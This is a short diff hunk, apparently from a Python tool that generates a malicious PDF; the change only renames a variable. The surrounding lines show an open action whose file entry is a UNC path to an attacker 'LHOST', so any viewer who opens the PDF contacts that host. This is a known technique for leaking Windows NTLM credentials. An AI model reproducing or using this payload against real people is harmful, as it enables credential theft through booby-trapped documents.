@@ -27,7 +27,7 @@ startxref
    /Contents 4 0 R
    /AA <<
 	   /O <<
-	      /F (\\\\\\\\""" + ask.lhost + """\\\\test)
+	      /F (\\\\\\\\""" + ask.LHOST + """\\\\test)
 		  /D [ 0 /Fit]
 		  /S /GoToE
 		  >>
